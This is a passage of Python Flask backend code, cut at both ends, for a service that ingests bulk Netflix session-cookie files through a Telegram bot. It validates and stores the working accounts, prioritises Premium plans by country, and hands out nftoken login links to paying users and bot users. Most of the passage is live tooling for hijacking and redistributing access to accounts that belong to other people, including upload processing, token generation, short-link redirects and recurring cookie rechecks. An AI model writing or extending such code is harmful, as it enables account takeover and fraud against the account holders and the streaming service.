    return None, 'Supabase could not allocate a unique short-link code.'


def _telegram_login_copy_keyboard(urls):
    buttons = []
    for label, key in (
        ('📱 Copy Phone', 'phone'),
        ('📺 Copy TV', 'tv'),
        ('💻 Copy PC', 'pc')
    ):
        value = str((urls or {}).get(key) or '')
        # Telegram CopyTextButton accepts 1-256 characters.
        if 1 <= len(value) <= 256:
            buttons.append({'text': label, 'copy_text': {'text': value}})
    if not buttons:
        return None
    return {'inline_keyboard': [buttons[:2], buttons[2:]] if len(buttons) > 2 else [buttons]}


@app.route('/t/<code>/<device>', methods=['GET'])
def telegram_short_login_redirect(code, device):
    """Resolve an unguessable, expiring Telegram short link to Netflix."""
    if not re.fullmatch(r'[A-Za-z0-9_-]{16,64}', code or ''):
        return Response('Invalid link', status=404, mimetype='text/plain')
    paths = {'phone': 'unsupported', 'tv': 'tv8', 'pc': 'browse'}
    netflix_path = paths.get(str(device or '').lower())
    if not netflix_path:
        return Response('Invalid device link', status=404, mimetype='text/plain')

    headers = supabase_service_headers()
    try:
        response = requests.get(
            f'{SUPABASE_URL}/rest/v1/telegram_short_links',
            params={'select': 'nftoken,expires_at', 'code': f'eq.{code}', 'limit': '1'},
            headers=headers,
            timeout=15
        )
        if response.status_code != 200 or not response.json():
            return Response('Link not found', status=404, mimetype='text/plain')
        record = response.json()[0]
        expires_at = datetime.fromisoformat(
            str(record.get('expires_at') or '').replace('Z', '+00:00')
        )
        if expires_at.tzinfo is None:
            expires_at = expires_at.replace(tzinfo=timezone.utc)
        if expires_at <= datetime.now(timezone.utc):
            return Response('This login link has expired', status=410, mimetype='text/plain')
        token = str(record.get('nftoken') or '')
        if not token:
            return Response('Link not found', status=404, mimetype='text/plain')
        target = f'https://netflix.com/{netflix_path}?nftoken={urllib.parse.quote(token, safe="")}'
        return redirect(target, code=302)
    except Exception as exc:
        logger.error(f'Telegram short-link resolution failed: {exc}')
        return Response('Unable to resolve this login link', status=500, mimetype='text/plain')


def _telegram_random_account(database_user_id, chat_id, message_id, ip_address, base_url):
    try:
        attempts_per_tier = _telegram_env_int(
            'TELEGRAM_RANDOM_ATTEMPTS_PER_TIER', 25, 1, 100
        )
        candidates = _telegram_priority_pool(
            per_tier=attempts_per_tier, prefer_recent=True
        )
    except Exception as exc:
        logger.exception('Telegram random-account loading failed')
        return False, f'Unable to load the account pool: {exc}', None
    if not candidates:
        return False, 'No active accounts with both NetflixId cookies are available.', None

    timeout_seconds = _telegram_env_int(
        'TELEGRAM_RANDOM_TIMEOUT_SECONDS', 90, 30, 240
    )
    started_at = time.monotonic()
    attempts = 0
    timed_out = False

    for attempt, account in enumerate(candidates, 1):
        if attempts and time.monotonic() - started_at >= timeout_seconds:
            timed_out = True
            break
        attempts = attempt
        _, tier_label = _tv_candidate_priority(account)
        recently_validated = _account_was_recently_validated(account)
        if attempt == 1 or attempt % 5 == 0:
            validation_note = (
                'Using its recent successful batch validation...'
                if recently_validated else
                'Validating the membership before generating login links...'
            )
            _telegram_edit(
                chat_id,
                message_id,
                f'Random account: checking {attempt}/{len(candidates)}\n'
                f'Priority group: {tier_label}\n'
                f'{validation_note}'
            )
        if not recently_validated:
            is_valid, info = validate_netflix_cookie_quick({
                'NetflixId': account['netflix_id'],
                'SecureNetflixId': account['secure_netflix_id']
            })
            _record_tv_validation(account, is_valid, info)
            if not is_valid:
                continue

        token_result = generate_token(
            account['netflix_id'], account.get('secure_netflix_id')
        )
        if token_result.get('status') != 'Success':
            continue
        summary = _tv_account_summary(account)
        log_token_generation(
            account_id=account.get('id'),
            user_id=database_user_id,
            ip_address=ip_address,
            token=token_result.get('token')
        )
        token = str(token_result.get('token') or '')
        if not token:
            continue
        encoded_token = urllib.parse.quote(token, safe='')
        phone_url = f'https://netflix.com/unsupported?nftoken={encoded_token}'
        tv_url = f'https://netflix.com/tv8?nftoken={encoded_token}'
        pc_url = f'https://netflix.com/browse?nftoken={encoded_token}'
        return True, (
            '<b>🎟️ RANDOM ACCOUNT READY</b>\n'
            '━━━━━━━━━━━━━━━━━━━━\n'
            f'👤 Account: <code>{html.escape(str(summary["email"]))}</code>\n'
            f'🌍 Country: {html.escape(str(summary["country"]))}\n'
            f'👑 Plan: {html.escape(str(summary["plan"]))}\n'
            f'📅 Renewal: {html.escape(str(summary["renewal"] or "Not available"))}\n'
            f'🎯 Priority: {html.escape(str(tier_label))}\n'
            f'🔎 Accounts checked: {attempt}\n'
            '━━━━━━━━━━━━━━━━━━━━\n'
            '<b>Login links</b>\n'
            f'<a href="{html.escape(phone_url, quote=True)}">📱 Open Phone Login</a>\n'
            f'<a href="{html.escape(tv_url, quote=True)}">📺 Open TV Login</a>\n'
            f'<a href="{html.escape(pc_url, quote=True)}">💻 Open PC Login</a>\n\n'
            '<i>Tap a link to open it.</i>'
        ), None
    if timed_out:
        return False, (
            f'No working account was found before the {timeout_seconds}-second safety limit '
            f'after {attempts} prioritized attempt(s).'
        ), None
    return False, f'No working account was found after {attempts} prioritized attempt(s).', None


@app.route('/api/telegram/webhook', methods=['POST'])
def telegram_webhook():
    """Receive Telegram updates, validate cookie ZIPs, and store working accounts."""
    webhook_secret = os.environ.get('TELEGRAM_WEBHOOK_SECRET', '').strip()
    supplied_secret = request.headers.get('X-Telegram-Bot-Api-Secret-Token', '')
    if not webhook_secret or not secrets.compare_digest(supplied_secret, webhook_secret):
        return jsonify({'ok': False}), 401

    update = request.get_json(silent=True) or {}
    message = update.get('message') or {}
    update_id = update.get('update_id')
    chat_id = (message.get('chat') or {}).get('id')
    telegram_user_id = (message.get('from') or {}).get('id')
    if not chat_id or telegram_user_id is None:
        return jsonify({'ok': True})

    if telegram_user_id not in _telegram_allowed_users():
        _telegram_send(
            chat_id,
            f'Access denied. Your Telegram user ID is {telegram_user_id}. '
            'Add it to TELEGRAM_ALLOWED_USER_IDS in Vercel.'
        )
        return jsonify({'ok': True})

    raw_text = str(message.get('text') or '').strip()
    text = raw_text.lower()
    if text.startswith('/start') or text.startswith('/help'):
        _telegram_send(
            chat_id,
            'Netflix account bot is ready.\n\n'
            'Upload a ZIP containing .txt/.json cookie files, or upload one cookie file directly. '
            'I will validate each unique account and save/update working memberships in Supabase.\n\n'
            'TV login: /tv 12345678\n'
            'Random prioritized account: /random\n\n'
            'Priority: PH Premium, then US Premium, then other active subscriptions.\n\n'
            'Commands: /tv, /random, /status, /help'
        )
        return jsonify({'ok': True})
    tv_match = re.fullmatch(r'/tv(?:@\w+)?(?:\s+(\d{8}))?\s*', raw_text, re.I)
    plain_code_match = re.fullmatch(r'\d{8}', raw_text)
    if tv_match or plain_code_match:
        code = plain_code_match.group(0) if plain_code_match else tv_match.group(1)
        if not code:
            _telegram_send(
                chat_id,
                'Send the 8-digit code like this:\n/tv 12345678\n\n'
                'You can also send only the 8 digits in your next message.'
            )
            return jsonify({'ok': True})
        database_user_id = os.environ.get('TELEGRAM_DATABASE_USER_ID', '').strip()
        if not re.fullmatch(r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}', database_user_id):
            _telegram_send(chat_id, 'Bot configuration error: TELEGRAM_DATABASE_USER_ID is missing or invalid.')
            return jsonify({'ok': True})
        if update_id is not None:
            claim_result = _telegram_claim_update(
                update_id, telegram_user_id, chat_id, '/tv'
            )
            if claim_result is not True:
                if claim_result is None:
                    _telegram_send(chat_id, 'Unable to start safely because the job ledger is unavailable. Please try again shortly.')
                return jsonify({'ok': True})
        progress = _telegram_send(
            chat_id,
            'TV login started.\nPriority: PH Premium -> US Premium -> other active subscriptions.'
        )
        progress_id = progress.get('message_id') if isinstance(progress, dict) else None
        success, result_message = _telegram_tv_login(
            code, database_user_id, chat_id, progress_id, request.remote_addr
        )
        final_text = ('Success\n\n' if success else 'TV login failed\n\n') + result_message
        if not _telegram_edit(chat_id, progress_id, final_text):
            _telegram_send(chat_id, final_text)
        if update_id is not None:
            _telegram_finish_update(
                update_id, 'completed', summary={'operation': 'tv', 'success': success}
            )
        return jsonify({'ok': True})
    if text.startswith('/tv'):
        _telegram_send(chat_id, 'Invalid TV code. Use exactly 8 digits, for example: /tv 12345678')
        return jsonify({'ok': True})
    if re.fullmatch(r'/random(?:@\w+)?\s*', raw_text, re.I):
        database_user_id = os.environ.get('TELEGRAM_DATABASE_USER_ID', '').strip()
        if not re.fullmatch(r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}', database_user_id):
            _telegram_send(chat_id, 'Bot configuration error: TELEGRAM_DATABASE_USER_ID is missing or invalid.')
            return jsonify({'ok': True})
        if update_id is not None:
            claim_result = _telegram_claim_update(
                update_id, telegram_user_id, chat_id, '/random'
            )
            if claim_result is not True:
                if claim_result is None:
                    _telegram_send(chat_id, 'Unable to start safely because the job ledger is unavailable. Please try again shortly.')
                return jsonify({'ok': True})
        progress = _telegram_send(
            chat_id,
            'Finding a random working account.\nPriority: PH Premium -> US Premium -> other active subscriptions.'
        )
        progress_id = progress.get('message_id') if isinstance(progress, dict) else None
        success, result_message, reply_markup = _telegram_random_account(
            database_user_id,
            chat_id,
            progress_id,
            request.remote_addr,
            request.url_root.rstrip('/')
        )
        final_text = result_message if success else '❌ RANDOM ACCOUNT FAILED\n\n' + result_message
        parse_mode = 'HTML' if success else None
        if not _telegram_edit(
            chat_id,
            progress_id,
            final_text,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        ):
            _telegram_send(
                chat_id,
                final_text,
                reply_markup=reply_markup,
                parse_mode=parse_mode
            )
        if update_id is not None:
            _telegram_finish_update(
                update_id, 'completed', summary={'operation': 'random', 'success': success}
            )
        return jsonify({'ok': True})
    if text.startswith('/status'):
        _telegram_send(
            chat_id,
            'Bot status: ready\n'
            f'Max cookie files per ZIP: {_telegram_env_int("TELEGRAM_MAX_COOKIE_FILES", 3000, 1, 5000)}\n'
            f'Workers: {_telegram_env_int("TELEGRAM_MAX_WORKERS", 12, 1, 20)}'
        )
        return jsonify({'ok': True})

    document = message.get('document')
    if not document:
        _telegram_send(chat_id, 'Please upload a ZIP, TXT, JSON, or COOKIES file.')
        return jsonify({'ok': True})

    database_user_id = os.environ.get('TELEGRAM_DATABASE_USER_ID', '').strip()
    if not re.fullmatch(r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}', database_user_id):
        _telegram_send(chat_id, 'Bot configuration error: TELEGRAM_DATABASE_USER_ID is missing or invalid.')
        return jsonify({'ok': True})

    filename = os.path.basename(document.get('file_name') or 'upload.zip')
    if update_id is not None:
        claim_result = _telegram_claim_update(
            update_id, telegram_user_id, chat_id, filename
        )
        if claim_result is not True:
            if claim_result is None:
                _telegram_send(
                    chat_id,
                    'Unable to start this batch safely because the job ledger is unavailable. '
                    'Please verify the Telegram migration and try again shortly.'
                )
            return jsonify({'ok': True})

    progress_message = _telegram_send(
        chat_id,
        f'Upload received: {filename}\nDownloading and reading the cookie files...'
    )
    progress_message_id = (
        progress_message.get('message_id') if isinstance(progress_message, dict) else None
    )
    last_progress_edit = {'time': time.monotonic(), 'completed': 0}

    def report_progress(completed, total, current_results):
        if completed >= total:
            return
        now = time.monotonic()
        completed_delta = completed - last_progress_edit['completed']
        if completed_delta < 25 and now - last_progress_edit['time'] < 10:
            return
        _telegram_edit(
            chat_id,
            progress_message_id,
            _telegram_progress_message(filename, completed, total, current_results)
        )
        last_progress_edit['time'] = now
        last_progress_edit['completed'] = completed

    try:
        payload = _telegram_download_document(document)
        results = _telegram_process_upload(
            payload, filename, database_user_id, progress_callback=report_progress
        )
        result_text, summary = _telegram_results_message(filename, results)
        if not _telegram_edit(chat_id, progress_message_id, result_text):
            _telegram_send(chat_id, result_text)
        if update_id is not None:
            _telegram_finish_update(update_id, 'completed', summary=summary)
    except Exception as exc:
        logger.exception('Telegram cookie batch failed')
        failure_message = f'Batch failed: {str(exc)[:500]}'
        if not _telegram_edit(chat_id, progress_message_id, failure_message):
            _telegram_send(chat_id, failure_message)
        if update_id is not None:
            _telegram_finish_update(update_id, 'failed', error=exc)

    return jsonify({'ok': True})

@app.route('/api/accounts', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def get_accounts(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        is_premium = has_premium_access(user.id)
        is_admin = is_super_admin(user.id)
        
        logger.info(f"User {user.id} accessing accounts. Premium: {is_premium}, Admin: {is_admin}")
        
        if not is_premium and not is_admin:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required to view accounts"
            }), 403
        
        # SAME FILTER FOR EVERYONE: only active, premium, non-expired accounts
        account_fields = (
            'id,email,subscription_type,country,plan,created_at,last_checked,'
            'secure_netflix_id,days_until_billing,next_billing_date,'
            'exclusive_access,reserved_for_super_admin,is_expired,added_by'
        )
        query = supabase.table('netflix_accounts')\
            .select(account_fields)\
            .eq('is_active', True)\
            .eq('is_premium', True)\
            .eq('is_expired', False)\
        
        country_filter = request.args.get('country')
        if country_filter:
            query = query.eq('country', country_filter)
        
        query = query.order('created_at', desc=True)
        accounts = query.execute()
        
        if is_admin:
            ph_count = ensure_ph_accounts_pool()
            logger.info(f"Super admin {user.id} accessed accounts. PH pool: {ph_count}")
        
        safe_accounts = []
        viewer_country = get_viewer_country()
        for acc in accounts.data or []:
            # Extra safety: skip anything that slipped through with negative billing
            days_left = acc.get('days_until_billing')
            if days_left is not None and days_left < 0:
                continue
            
            is_ad_plan, region_compatible = get_region_compatibility(
                acc.get('plan'), acc.get('subscription_type'), viewer_country
            )
            account_data = {
                'id': acc['id'],
                'email': acc['email'],
                'subscription_type': acc['subscription_type'],
                'country': acc['country'],
                'plan': acc['plan'],
                'created_at': acc['created_at'],
                'last_checked': acc['last_checked'],
                # The UI only needs availability, never the credential itself.
                'secure_netflix_id': bool(acc.get('secure_netflix_id')),
                'days_until_billing': days_left,
                'next_billing_date': acc.get('next_billing_date'),
                'is_ad_supported_plan': is_ad_plan,
                'region_compatible': region_compatible,
                'viewer_country': viewer_country
            }
            
            # Admins see extra metadata (but same filtered accounts)
            if is_admin:
                account_data['is_exclusive'] = acc.get('exclusive_access', False)
                account_data['reserved_for_super_admin'] = acc.get('reserved_for_super_admin', False)
                account_data['is_expired'] = acc.get('is_expired', False)
                account_data['added_by'] = acc.get('added_by')
            
            safe_accounts.append(account_data)
        
        return jsonify({
            "status": "success",
            "accounts": safe_accounts,
            "is_super_admin": is_admin,
            "viewer_country": viewer_country,
            "total_count": len(safe_accounts)
        })
        
    except Exception as e:
        logger.error(f"Error getting accounts: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/accounts/exclusive', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def get_exclusive_accounts(user):
    """Get accounts reserved for super admin only"""
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        fields = (
            'id,email,subscription_type,country,plan,exclusive_access,'
            'reserved_for_super_admin,is_active,created_at,last_checked'
        )
        query = urllib.parse.urlencode({
            'select': fields,
            'or': '(exclusive_access.eq.true,reserved_for_super_admin.eq.true)',
            'is_active': 'eq.true',
            'order': 'created_at.desc',
            'limit': '1000'
        })
        response = requests.get(
            f"{SUPABASE_URL}/rest/v1/netflix_accounts?{query}",
            headers=supabase_service_headers(),
            timeout=30
        )
        if response.status_code != 200:
            raise RuntimeError(
                f"Exclusive account query failed ({response.status_code}): "
                f"{response.text[:200]}"
            )

        account_rows = response.json()
        
        ph_accounts = [a for a in account_rows if a.get('country') == 'PH']
        other_accounts = [a for a in account_rows if a.get('country') != 'PH']
        
        return jsonify({
            "status": "success",
            "ph_accounts": {
                "count": len(ph_accounts),
                "accounts": ph_accounts[:20]
            },
            "other_exclusive": other_accounts[:20],
            "ph_minimum_met": len(ph_accounts) >= 8,
            "is_super_admin": True
        })
        
    except Exception as e:
        logger.error(f"Error getting exclusive accounts: {e}")
        return jsonify({
            "status": "error",
            "message": "Failed to load exclusive accounts"
        }), 500

@app.route('/api/accounts/<account_id>/set-exclusive', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def set_account_exclusive(user, account_id):
    """Mark an account as exclusive/super-admin-only"""
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        data = request.get_json()
        is_exclusive = data.get('exclusive_access', False)
        reserved_for_admin = data.get('reserved_for_super_admin', False)
        
        result = supabase.table('netflix_accounts')\
            .update({
                'exclusive_access': is_exclusive,
                'reserved_for_super_admin': reserved_for_admin,
                'updated_at': datetime.utcnow().isoformat()
            })\
            .eq('id', account_id)\
            .execute()
        
        if result.data:
            return jsonify({
                "status": "success",
                "message": "Account exclusivity updated",
                "account": result.data[0]
            })
        else:
            return jsonify({"status": "error", "message": "Account not found"}), 404
            
    except Exception as e:
        logger.error(f"Error setting exclusivity: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/accounts/<account_id>/generate-token', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def generate_account_token(user, account_id):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        is_premium = has_premium_access(user.id)
        
        if not is_premium:
            return jsonify({
                "status": "error",
                "message": "Premium subscription required"
            }), 403
        
        account = supabase.table('netflix_accounts')\
            .select('*')\
            .eq('id', account_id)\
            .eq('is_active', True)\
            .single()\
            .execute()
        
        if not account.data:
            return jsonify({
                "status": "error",
                "message": "Account not found"
            }), 404

        viewer_country = get_viewer_country()
        is_ad_plan, region_compatible = get_region_compatibility(
            account.data.get('plan'),
            account.data.get('subscription_type'),
            viewer_country
        )
        if is_ad_plan and region_compatible is False:
            return jsonify({
                "status": "error",
                "code": "AD_PLAN_REGION_RESTRICTED",
                "message": (
                    f"This is an ad-supported plan and it is not available in "
                    f"your current region ({viewer_country}). Choose an ad-free account."
                ),
                "viewer_country": viewer_country
            }), 409
        
        netflix_id = account.data.get('netflix_id')
        
        if not netflix_id:
            return jsonify({
                "status": "error",
                "message": "Invalid account data"
            })
        
        token_result = generate_token(netflix_id)
        
        if token_result["status"] != "Success":
            return jsonify({
                "status": "error",
                "message": "Failed to generate token"
            })
        
        log_token_generation(
            account_id=account_id,
            user_id=user.id,
            ip_address=request.remote_addr
        )
        
        return jsonify({
            "status": "success",
            "data": {
                "email": account.data['email'],
                "subscription_type": account.data['subscription_type'],
                "token": token_result["token"],
                "expires": token_result["expires"],
                "login_urls": token_result["login_urls"]
            }
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        "status": "ok",
        "env_vars_set": {
            "SUPABASE_URL": bool(os.environ.get('SUPABASE_URL')),
            "SUPABASE_SERVICE_KEY": bool(os.environ.get('SUPABASE_SERVICE_KEY')),
            "FLASK_SECRET_KEY": bool(os.environ.get('FLASK_SECRET_KEY'))
        }
    })

ACCOUNT_HEALTH_FIELDS = {
    'validation_status', 'last_validation_error', 'consecutive_failures'
}


def classify_account_health(account_info):
    """Classify a validation result without treating temporary network errors as dead."""
    if account_info.get('ok', False):
        if not account_info.get('email') or account_info.get('email') == 'Unknown':
            return 'dead', 'Incomplete account data'
        return 'working', None

    default_reason = 'Billing date has passed' if account_info.get('is_expired') else 'Unknown validation error'
    reason = str(account_info.get('err') or default_reason)
    normalized = reason.lower()
    transient_terms = ('timeout', 'timed out', 'connection', 'dns', 'ssl', 'temporary', 'rate limit')
    expired_terms = ('payment', 'billing', 'cancel', 'inactive', 'on hold', 'restart', 'membership expired')

    if any(term in normalized for term in transient_terms):
        return 'unknown', reason
    if account_info.get('is_expired') or any(term in normalized for term in expired_terms):
        return 'expired', reason
    return 'dead', reason


def patch_account_health(account_id, update_data, headers):
    """Update new health fields, with a safe fallback before the SQL migration is applied."""
    update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account_id}"
    response = requests.patch(update_url, headers=headers, json=update_data, timeout=30)
    if response.status_code in (200, 204):
        return

    legacy_data = {key: value for key, value in update_data.items() if key not in ACCOUNT_HEALTH_FIELDS}
    fallback = requests.patch(update_url, headers=headers, json=legacy_data, timeout=30)
    if fallback.status_code not in (200, 204):
        raise RuntimeError(f"Database update failed ({fallback.status_code}): {fallback.text[:200]}")


def validate_stored_account(account):
    netflix_id = account.get('netflix_id')
    if not netflix_id:
        return account, {'ok': False, 'err': 'Missing NetflixId'}

    cookie_data = {'NetflixId': netflix_id}
    if account.get('secure_netflix_id'):
        cookie_data['SecureNetflixId'] = account['secure_netflix_id']
    return account, check_netflix_cookie(cookie_data)


@app.route('/api/cron/validate-accounts', methods=['GET', 'POST'])
def cron_validate_accounts():
    cron_secret = os.environ.get('CRON_SECRET', '')
    expected_auth = f"Bearer {cron_secret}"
    supplied_auth = request.headers.get('Authorization', '')

    if os.environ.get('VERCEL_ENV') == 'production':
        if not cron_secret or not secrets.compare_digest(supplied_auth, expected_auth):
            return jsonify({'status': 'unauthorized'}), 401

    try:
        try:
            requested_batch_size = int(
                request.args.get('batch_size', os.environ.get('CRON_BATCH_SIZE', '20'))
            )
        except (TypeError, ValueError):
            return jsonify({'status': 'error', 'message': 'batch_size must be an integer'}), 400

        batch_size = max(1, min(requested_batch_size, 50))
        include_inactive = request.args.get('include_inactive', 'false').lower() in (
            '1', 'true', 'yes'
        )
        cycle_started_at = request.args.get('cycle_started_at')
        cycle_filter = None
        if cycle_started_at:
            try:
                parsed_cycle = datetime.fromisoformat(cycle_started_at.replace('Z', '+00:00'))
                if parsed_cycle.tzinfo is None:
                    parsed_cycle = parsed_cycle.replace(tzinfo=timezone.utc)
                cycle_filter = parsed_cycle.astimezone(timezone.utc).isoformat()
            except ValueError:
                return jsonify({
                    'status': 'error',
                    'message': 'cycle_started_at must be a valid ISO-8601 timestamp'
                }), 400

        headers = supabase_service_headers('return=minimal')

        # Recheck inactive records too; otherwise a temporarily failed account can never recover.
        # Scheduled calls only pick records due for a daily check. Manual full-cycle
        # calls pass one stable cycle timestamp and work through every older record.
        selection_before = cycle_filter or (
            datetime.now(timezone.utc) - timedelta(hours=24)
        ).isoformat()
        query_params = {
            'select': 'id,netflix_id,secure_netflix_id,is_active,is_expired,last_checked',
            'order': 'last_checked.asc.nullsfirst',
            'limit': str(batch_size),
            'or': f'(last_checked.is.null,last_checked.lt.{selection_before})'
        }
        if not include_inactive:
            # Expired and dead records are deactivated when classified, so scheduled
            # validation only spends time on accounts that may still be working.
            query_params['is_active'] = 'eq.true'

        fetch_url = (
            f"{SUPABASE_URL}/rest/v1/netflix_accounts?"
            f"{urllib.parse.urlencode(query_params)}"
        )
        fetch_resp = requests.get(fetch_url, headers=headers, timeout=30)
        if fetch_resp.status_code != 200:
            return jsonify({
                'status': 'error',
                'message': f'Fetch failed: {fetch_resp.status_code} {fetch_resp.text[:200]}'
            }), 500

        accounts = fetch_resp.json()

        if not accounts:
            return jsonify({
                'status': 'success',
                'message': 'No accounts to check',
                'checked': 0,
                'batch_size': batch_size,
                'has_more': False,
                'include_inactive': include_inactive
            })

        results = {
            'working': 0,
            'expired': 0,
            'dead': 0,
            'unknown': 0,
            'updated': 0,
            'errors': []
        }
        max_workers = max(1, min(int(os.environ.get('CRON_MAX_WORKERS', '4')), 8))

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_map = {
                executor.submit(validate_stored_account, account): account['id']
                for account in accounts
            }

            for future in as_completed(future_map):
                account_id = future_map[future]
                try:
                    account, account_info = future.result()
                    health_status, error_reason = classify_account_health(account_info)
                    now = datetime.now(timezone.utc).isoformat()

                    update_data = {
                        'last_checked': now,
                        'validation_status': health_status,
                        'last_validation_error': error_reason,
                        'consecutive_failures': 0 if health_status == 'working' else 1
                    }

                    if health_status == 'working':
                        update_data.update({
                            'plan': account_info.get('plan', 'Unknown'),
                            'subscription_type': account_info.get('subscription_type', 'Unknown'),
                            'country': account_info.get('country', 'Unknown'),
                            'is_active': True,
                            'is_premium': account_info.get('premium', False),
                            'next_billing_date': account_info.get('next_billing_date'),
                            'days_until_billing': account_info.get('days_until_billing'),
                            'is_expired': False,
                            'deactivated_reason': None,
                            'deactivated_at': None
                        })
                    elif health_status in ('expired', 'dead'):
                        update_data.update({
                            'is_active': False,
                            'is_premium': False,
                            'is_expired': health_status == 'expired',
                            'deactivated_reason': error_reason,
                            'deactivated_at': now
                        })
                    # For an unknown/network result, preserve the previous active state.

                    patch_account_health(account['id'], update_data, headers)
                    results[health_status] += 1
                    results['updated'] += 1
                except Exception as exc:
                    logger.error(f"Error checking account {account_id}: {exc}")
                    if len(results['errors']) < 20:
                        results['errors'].append({'account_id': account_id, 'error': str(exc)})

        return jsonify({
            'status': 'success' if not results['errors'] else 'partial_success',
            'checked': len(accounts),
            'batch_size': batch_size,
            'has_more': len(accounts) == batch_size,
            'cycle_started_at': cycle_filter,
            'selection_before': selection_before,
            'include_inactive': include_inactive,
            'results': results
        })
    except Exception as exc:
        logger.exception("Cron job failed")
        return jsonify({'status': 'error', 'message': str(exc)}), 500

@app.route('/api/admin/bulk-recheck', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_super_admin
def bulk_recheck_accounts(user):
    if request.method == 'OPTIONS':
        return '', 204

    try:
        headers = supabase_service_headers('return=minimal')
        
        data = request.get_json() or {}
        chunk_size = data.get('chunk_size', 15)
        offset = data.get('offset', 0)
        
        # Get accounts that need rechecking
        fetch_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_active=eq.true&order=created_at.desc&limit={chunk_size}&offset={offset}"
        fetch_resp = requests.get(fetch_url, headers=headers, timeout=30)
        
        if fetch_resp.status_code != 200:
            return jsonify({'status': 'error', 'message': f'Failed to fetch: {fetch_resp.status_code}'}), 500
        
        accounts = fetch_resp.json()
        
        if not accounts:
            return jsonify({
                'status': 'complete',
                'message': 'No more accounts to process',
                'chunk': [],
                'offset': offset,
                'has_more': False
            })
        
        results = []
        valid_count = 0
        invalid_count = 0
        
        for account in accounts:
            account_id = account['id']
            netflix_id = account.get('netflix_id')
            email = account.get('email', 'Unknown')
            
            if not netflix_id:
                # Mark as invalid immediately
                _deactivate_account(account_id, 'Missing NetflixId', headers)
                invalid_count += 1
                results.append({'email': email, 'status': 'invalid', 'reason': 'Missing NetflixId'})
                continue

            try:
                account_info = check_netflix_cookie({"NetflixId": netflix_id})
            except Exception as e:
                logger.error(f"Exception checking {email}: {e}")
                # CRITICAL: Mark as invalid on ANY exception
                _deactivate_account(account_id, f'Check exception: {str(e)[:100]}', headers)
                invalid_count += 1
                results.append({'email': email, 'status': 'invalid', 'reason': f'Check failed: {str(e)[:100]}'})
                continue
            
            # Determine validity
            is_valid = account_info.get('ok', False)
            error_reason = account_info.get('err', 'Unknown error')
            
            # Additional safety checks
            if is_valid and (not account_info.get('email') or account_info.get('email') == 'Unknown'):
                is_valid = False
                error_reason = 'Incomplete account data (missing email)'
            
            if is_valid and account_info.get('plan') == 'Unknown' and not account_info.get('premium', False):
                is_valid = False
                error_reason = 'Unknown plan, likely expired or invalid'
            
            if is_valid:
                # Update valid account
                update_data = {
                    'last_checked': datetime.now(timezone.utc).isoformat(),
                    'plan': account_info['plan'],
                    'subscription_type': account_info['subscription_type'],
                    'country': account_info['country'],
                    'is_active': True,
                    'is_premium': account_info['premium'],
                    'next_billing_date': account_info.get('next_billing_date'),
                    'days_until_billing': account_info.get('days_until_billing'),
                    'is_expired': False,
                    'deactivated_reason': None,
                    'deactivated_at': None
                }
                
                update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account_id}"
                patch_resp = requests.patch(update_url, headers=headers, json=update_data, timeout=30)
                
                if patch_resp.status_code not in [200, 204]:
                    logger.error(f"PATCH valid failed for {account_id}: {patch_resp.status_code}")
                
                valid_count += 1
                results.append({
                    'email': email,
                    'status': 'valid',
                    'plan': account_info['plan'],
                    'country': account_info['country']
                })
                
            else:
                # Mark as invalid
                success = _deactivate_account(
                    account_id, 
                    error_reason, 
                    headers,
                    extra_data={
                        'plan': account_info.get('plan', 'Unknown'),
                        'country': account_info.get('country', 'Unknown'),
                        'is_premium': False
                    }
                )
                
                if not success:
                    logger.error(f"Failed to deactivate {account_id}")
                
                invalid_count += 1
                results.append({
                    'email': email,
                    'status': 'invalid',
                    'reason': error_reason
                })

            time.sleep(1.5)

        # Check if more accounts exist
        next_offset = offset + len(accounts)
        count_resp = requests.get(
            f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=*&is_active=eq.true&limit=1&offset={next_offset}",
            headers=headers, timeout=30
        )
        has_more = len(count_resp.json()) > 0 if count_resp.status_code == 200 else False

        return jsonify({
            'status': 'success',
            'chunk': results,
            'offset': offset,
            'next_offset': next_offset,
            'has_more': has_more,
            'chunk_valid': valid_count,
            'chunk_invalid': invalid_count,
            'message': f'Processed {len(results)} accounts. {valid_count} valid, {invalid_count} invalid.'
        })

    except Exception as e:
        logger.error(f"Bulk recheck failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({'status': 'error', 'message': str(e)}), 500


def _deactivate_account(account_id, reason, headers, extra_data=None):
    """Helper to mark account as inactive with proper error handling"""
    update_data = {
        'is_active': False,
        'last_checked': datetime.now(timezone.utc).isoformat(),
        'deactivated_reason': reason,
        'deactivated_at': datetime.now(timezone.utc).isoformat(),
        'is_expired': True,
        'is_premium': False
    }
    if extra_data:
        update_data.update(extra_data)
    
